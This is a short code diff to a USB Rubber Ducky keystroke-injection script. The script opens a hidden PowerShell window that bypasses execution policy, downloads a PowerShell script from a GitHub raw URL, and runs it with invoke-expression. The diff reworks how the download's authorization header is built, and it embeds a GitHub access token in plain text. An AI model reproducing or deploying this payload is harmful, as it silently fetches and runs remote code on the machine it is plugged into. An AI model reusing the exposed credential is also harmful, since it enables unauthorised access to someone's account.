@@ -11,6 +11,11 @@ STRING powershell -w h -NoP -NonI -Exec Bypass
 ENTER
 DELAY 200
 STRING $headers = @{} #create an empty directory
-$pl = iwr https://raw.githubusercontent.com/blastbass106/RubberDuckyTesting/main/Download.ps1?dl=1 -Headers "{@Authorization@ = @token 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@}; invoke-expression $pl
+ENTER
+DELAY 200
+STRING $headers.Add("Authorization", "token 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") # Add the Authorization header
+ENTER
+DELAY 200
+STRING $pl = iwr https://raw.githubusercontent.com/blastbass106/RubberDuckyTesting/main/Download.ps1?dl=1 -Headers $headers; invoke-expression $pl
 DELAY 500
 ENTER
